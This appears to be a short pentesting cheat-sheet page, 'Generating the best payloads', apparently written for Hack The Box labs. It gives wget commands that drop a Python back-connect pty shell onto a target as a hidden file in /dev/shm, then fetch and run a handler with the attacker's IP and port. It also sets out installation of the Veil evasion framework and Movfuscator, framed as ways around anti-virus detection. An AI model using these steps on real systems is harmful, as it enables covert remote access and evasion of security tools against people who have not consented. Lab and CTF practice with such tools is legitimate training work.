---
layout: default
title: Generating the best payloads
---

Python
======
A very easy way to established our connection is to drop this pty shell to the targeted box:
{% highlight bash%}
wget https://raw.githubusercontent.com/Mushi-mushi/python-pty-shells/master/sctp_pty_backconnect.py -o /dev/shm/.shell.py
{% endhighlight %}
configure the shell with the correct IP and port then get the shell handler
{% highlight bash%}
wget https://raw.githubusercontent.com/Mushi-mushi/python-pty-shells/master/sctp_pty_shell_handler.py -o /root/HTB/handler.py
python handler.py -b YourIP:Youropenedport
{% endhighlight %}
<sup>Shell scripts from [infodox][link11]</sup>

Unfortunately, and as with very many Metasploit payloads generated through MSFvenom, those are easily picked up by anti-virus nowadays.

Veil
=============
First off, we need to install the Veil framework which is easily done on Kali with:
{% highlight bash%}
apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
{% endhighlight %}
Manual install:
{% highlight bash%}
sudo apt-get -y install git
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/
./config/setup.sh --force --silent
{% endhighlight %}

Veil is pretty easy to use:
{% highlight bash%}

===============================================================================
                             Veil | [Version]: 3.1.12
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

Main Menu

        2 tools loaded

Available Tools:

        1)      Evasion
        2)      Ordnance

Available Commands:

        exit                    Completely exit Veil
        info                    Information on a specific tool
        list                    List available tools
        options                 Show Veil configuration
        update                  Update Veil
        use                     Use a specific tool

Veil>: 

{% endhighlight %}

Movfuscator
=============
Installing Movfuscator
{% highlight bash%}
git clone https://github.com/xoreaxeaxeax/movfuscator
cd movfuscator
./build.sh
sudo ./install.sh
{% endhighlight %}
